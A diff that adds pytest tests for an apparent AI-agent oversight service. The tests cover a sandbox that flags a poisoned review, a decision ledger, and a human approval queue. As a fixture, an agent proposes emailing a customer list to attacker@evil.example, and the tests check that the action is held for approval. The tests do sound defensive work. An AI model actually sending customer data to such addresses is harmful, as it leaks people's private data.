@@ -457,3 +457,236 @@ def test_demo_tamper_endpoint():
         END;
     """)
     conn.commit()
+
+
+@pytest.mark.req("UI-01")
+def test_UI_01_sandbox_interaction():
+    """
+    UI-01 / Agent Sandbox:
+    - Create session (alice)
+    - Send clean message -> screened ingress + simulated reply steps
+    - Load poisoned review (rv-p2) -> screened ingress with sanitize, taints session to flagged
+    - Query simulated outbox -> returns structure
+    - Reset sandbox (admin) -> clears sandbox state
+    """
+    client = TestClient(app)
+    alice_token = mint_human_token("alice", ["requester"])
+    admin_token = mint_human_token("admin", ["admin", "approver"])
+
+    # 1. Create session
+    sess_res = client.post(
+        "/api/v1/sessions",
+        headers={"Authorization": f"Bearer {alice_token}"},
+        json={"agent_id": "supportbot"},
+    )
+    assert sess_res.status_code == 201
+    sess_data = sess_res.json()
+    session_id = sess_data["session_id"]
+    assert sess_data["taint_level"] == 0
+
+    # 2. Send clean message
+    msg_res = client.post(
+        "/api/v1/sandbox/message",
+        headers={"Authorization": f"Bearer {alice_token}"},
+        json={"session_id": session_id, "text": "What is the return policy?"},
+    )
+    assert msg_res.status_code == 200
+    steps = msg_res.json()["steps"]
+    assert len(steps) >= 1
+    assert any(s["kind"] == "ingress" and s["outcome"] == "allow" for s in steps)
+
+    # 3. Load poisoned review rv-p2
+    rev_res = client.post(
+        "/api/v1/sandbox/load-review",
+        headers={"Authorization": f"Bearer {alice_token}"},
+        json={"session_id": session_id, "review_id": "rv-p2"},
+    )
+    assert rev_res.status_code == 200
+    rev_data = rev_res.json()
+    assert rev_data["outcome"] == "sanitize"
+    assert rev_data["session"]["taint_level"] == 2
+    assert rev_data["session"]["taint_label"] == "flagged"
+
+    # 4. Outbox query
+    outbox_res = client.get(
+        "/api/v1/sandbox/outbox",
+        headers={"Authorization": f"Bearer {alice_token}"},
+    )
+    assert outbox_res.status_code == 200
+    outbox_data = outbox_res.json()
+    assert "emails" in outbox_data
+    assert "db_ops" in outbox_data
+
+    # 5. Non-admin reset fails with 403
+    reset_fail = client.post(
+        "/api/v1/sandbox/reset",
+        headers={"Authorization": f"Bearer {alice_token}"},
+    )
+    assert reset_fail.status_code == 403
+
+    # 6. Admin reset succeeds
+    reset_ok = client.post(
+        "/api/v1/sandbox/reset",
+        headers={"Authorization": f"Bearer {admin_token}"},
+    )
+    assert reset_ok.status_code == 200
+    assert reset_ok.json()["status"] == "reset"
+
+
+@pytest.mark.req("UI-02")
+def test_UI_02_live_decisions_feed_and_drawer():
+    """
+    UI-02 / Live Decisions:
+    - Decisions feed returns items with outcome, module, subject, reason, rule_ids, decision_path
+    - Pagination via since_seq works
+    - Detail drawer retrieves exact ledger entry with payload
+    """
+    client = TestClient(app)
+    alice_token = mint_human_token("alice", ["requester"])
+
+    # 1. Fetch decisions
+    feed_res = client.get(
+        "/api/v1/decisions?since_seq=0&limit=10",
+        headers={"Authorization": f"Bearer {alice_token}"},
+    )
+    assert feed_res.status_code == 200
+    feed_data = feed_res.json()
+    assert "items" in feed_data
+    assert "next_seq" in feed_data
+
+    # If items exist, test drawer endpoint GET /api/v1/ledger/{seq}
+    if feed_data["items"]:
+        seq = feed_data["items"][0]["seq"]
+        entry_res = client.get(
+            f"/api/v1/ledger/{seq}",
+            headers={"Authorization": f"Bearer {alice_token}"},
+        )
+        assert entry_res.status_code == 200
+        entry_data = entry_res.json()
+        assert entry_data["seq"] == seq
+        assert "hash" in entry_data
+        assert "prev_hash" in entry_data
+        assert "payload" in entry_data
+
+
+@pytest.mark.req("UI-03")
+def test_UI_03_approvals_screen_flow():
+    """
+    UI-03 / Approvals screen flow:
+    - Queue lists pending & decided approvals with descriptive summary
+    - Exact verbatim arguments returned with target
+    - Advisory LLM summary labeled 'advisory'
+    - Alice self-approval refused (403 approval.self_approval) and ledgered
+    - Bob approval accepted with signature digest
+    - Bob rejection flow transitions status to 'rejected'
+    """
+    client = TestClient(app)
+    alice_token = mint_human_token("alice", ["requester"])
+    bob_token = mint_human_token("bob", ["approver"])
+
+    # 1. Propose action that gets held (query customer_db limit 50)
+    conn = get_connection()
+    conn.execute(
+        """INSERT OR REPLACE INTO sessions
+           (session_id, agent_id, owner_user_id, taint_level, taint_reasons_json, created_at)
+           VALUES ('sess_ui03', 'supportbot', 'alice', 0, '[]', '2026-01-01T00:00:00.000Z')"""
+    )
+    conn.commit()
+
+    dec = propose_action(
+        agent_id="supportbot",
+        session_id="sess_ui03",
+        action_type="email.send",
+        arguments={"to": ["attacker@evil.example"], "subject": "Customer List", "body": "Sensitive data"},
+    )
+    assert dec["outcome"] == "hold"
+    approval_id = dec["approval_id"]
+    assert approval_id is not None
+
+    # 2. List queue
+    q_res = client.get(
+        "/api/v1/approvals?status=pending",
+        headers={"Authorization": f"Bearer {bob_token}"},
+    )
+    assert q_res.status_code == 200
+    items = q_res.json()["items"]
+    target_item = next((it for it in items if it["approval_id"] == approval_id), None)
+    assert target_item is not None
+    assert target_item["kind"] == "action"
+    assert target_item["requester"] == "alice"
+    assert "email.send" in target_item["summary"]
+
+    # 3. Get detail
+    det_res = client.get(
+        f"/api/v1/approvals/{approval_id}",
+        headers={"Authorization": f"Bearer {bob_token}"},
+    )
+    assert det_res.status_code == 200
+    det = det_res.json()
+    assert det["approval_id"] == approval_id
+    assert det["status"] == "pending"
+    assert "review" in det
+    review = det["review"]
+    assert review["action"]["action_type"] == "email.send"
+    assert review["action"]["arguments"]["to"] == ["attacker@evil.example"]
+    assert review["action"]["arguments"]["subject"] == "Customer List"
+    assert "fingerprint" in review
+    assert review["llm_summary"]["label"] == "advisory"
+    assert "rule_ids" in review
+    assert isinstance(review["rule_reasons"], dict)
+
+    # 4. Requester self-approval attempt (Alice) -> 403 approval.self_approval
+    self_res = client.post(
+        f"/api/v1/approvals/{approval_id}/decision",
+        headers={"Authorization": f"Bearer {alice_token}"},
+        json={"decision": "approve", "comment": "Alice approves own request"},
+    )
+    assert self_res.status_code == 403
+    assert self_res.json()["error"]["code"] == "approval.self_approval"
+
+    # Status remains pending
+    det_after_self = client.get(
+        f"/api/v1/approvals/{approval_id}",
+        headers={"Authorization": f"Bearer {bob_token}"},
+    ).json()
+    assert det_after_self["status"] == "pending"
+
+    # 5. Bob (approver) approves request -> 200 approved
+    approve_res = client.post(
+        f"/api/v1/approvals/{approval_id}/decision",
+        headers={"Authorization": f"Bearer {bob_token}"},
+        json={"decision": "approve", "comment": "Verified exception"},
+    )
+    assert approve_res.status_code == 200
+    app_data = approve_res.json()
+    assert app_data["status"] == "approved"
+    assert app_data["approver"] == "bob"
+    assert "signature" in app_data
+
+    # Status is now approved
+    det_approved = client.get(
+        f"/api/v1/approvals/{approval_id}",
+        headers={"Authorization": f"Bearer {bob_token}"},
+    ).json()
+    assert det_approved["status"] == "approved"
+    assert det_approved["approver"] == "bob"
+    assert det_approved["comment"] == "Verified exception"
+    assert det_approved["signature"] is not None
+
+    # 6. Test reject workflow on a second held action
+    dec2 = propose_action(
+        agent_id="supportbot",
+        session_id="sess_ui03",
+        action_type="email.send",
+        arguments={"to": ["bad@evil.example"], "subject": "Test", "body": "Test"},
+    )
+    app2_id = dec2["approval_id"]
+    reject_res = client.post(
+        f"/api/v1/approvals/{app2_id}/decision",
+        headers={"Authorization": f"Bearer {bob_token}"},
+        json={"decision": "reject", "comment": "Denied by policy"},
+    )
+    assert reject_res.status_code == 200
+    assert reject_res.json()["status"] == "rejected"
+
+
